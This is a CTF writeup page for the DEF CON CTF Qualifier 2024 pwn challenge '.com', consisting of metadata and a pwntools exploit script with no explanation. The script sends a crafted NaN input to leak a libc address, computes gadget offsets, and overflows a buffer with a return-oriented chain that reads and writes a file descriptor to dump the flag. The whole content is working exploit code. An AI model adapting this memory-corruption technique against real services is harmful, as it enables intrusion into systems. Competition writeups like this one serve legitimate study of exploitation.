---
title: ".com - DEF CON CTF Qualifier 2024"
category: "pwn"
type: "writeup"
tags: ["pwn", "com", "def-con-ctf-qualifier", "def-con-ctf-qualifier-2024", "2024", "ctf-writeup"]
summary: "nan = struct.unpack(\"Q\", struct.pack(\"d\", float('nan')))[0]"
source:
  name: "CTFtime writeup #39143"
  url: "https://ctftime.org/writeup/39143"
original_source: "https://uz56764.tistory.com/124"
ctf:
  name: "DEF CON CTF Qualifier 2024"
  year: 2024
  challenge: ".com"
---

## Metadata

- **CTF:** DEF CON CTF Qualifier 2024
- **Task:** .com
- **Author team:** RePokemonedCollections
- **CTFtime:** <https://ctftime.org/writeup/39143>
- **Original writeup:** <https://uz56764.tistory.com/124>

---
> <https://uz56764.tistory.com/124>

```py  
from pwn import *  
import struct

context.arch = "amd64"

nan = struct.unpack("Q", struct.pack("d", float('nan')))[0]

#r = process("dotcom_market")  
r = remote("[dotcom.shellweplayaga.me](http://dotcom.shellweplayaga.me)", 10001 )

r.sendlineafter(b"Ticket please:", b"ticket{here_is_your_ticket}")

r.sendlineafter(b"Enter graph description:", b"123")

r.sendlineafter(b">", b"0")  
s = f"0|0|0|0|0|" + "A"*0x400  
s = f"{len(s)}|{s}"  
r.sendlineafter(b"Paste model export text below:", s.encode())

r.sendlineafter(b">", b"0")  
s = f"0|0|0|0|0|" + "A"*0x400  
s = f"{len(s)}|{s}"  
r.sendlineafter(b"Paste model export text below:", s.encode())

r.sendlineafter(b">", b"66")  
r.sendlineafter(b">", b"1")

r.sendlineafter(b">", b"0")  
s = f"0|{nan}|0|0|0|" + "A" * 0x400  
s = f"{len(s)}|{s}"  
r.sendlineafter(b"Paste model export text below:", s.encode())

r.sendlineafter(b">", b"1")  
r.recvuntil(b"r = ")

leak = float(r.recvuntil(b" ", drop=True).decode())  
libc_leak = u64(struct.pack("d", leak * 10))  
libc_leak = libc_leak & ~0xfff  
libc_base = libc_leak - 0x21a000

pop_rdi = libc_base + 0x000000000002a3e5  
pop_rsi = libc_base + 0x000000000002be51  
pop_rdx_rbx = libc_base + 0x00000000000904a9  
write = libc_base + 0x0114870  
read = libc_base + 0x01147d0

print(f'libc_base = {hex(libc_base)}')

r.sendlineafter(b">", b"1")  
r.sendlineafter(b">", b"0")

raw_input()  
pay = b'1280|'  
pay += b'(): Asse' + b'A'*0x30  
pay += p64(0x401565)  
pay += b'X'*(1284 - len(pay))  
r.sendline(pay)

pay = b'B'*0x18  
pay += p64(pop_rdi)  
pay += p64(0x6)  
pay += p64(pop_rsi)  
pay += p64(libc_base+0x21c000)  
pay += p64(pop_rdx_rbx)  
pay += p64(0x100)  
pay += p64(0x0)  
pay += p64(read)

pay += p64(pop_rdi)  
pay += p64(0x1)  
pay += p64(pop_rsi)  
pay += p64(libc_base+0x21c000)  
pay += p64(pop_rdx_rbx)  
pay += p64(0x100)  
pay += p64(0x0)  
pay += p64(write)  
pay += p64(0xdeadbeef)

r.sendline(pay)

r.interactive()  
```
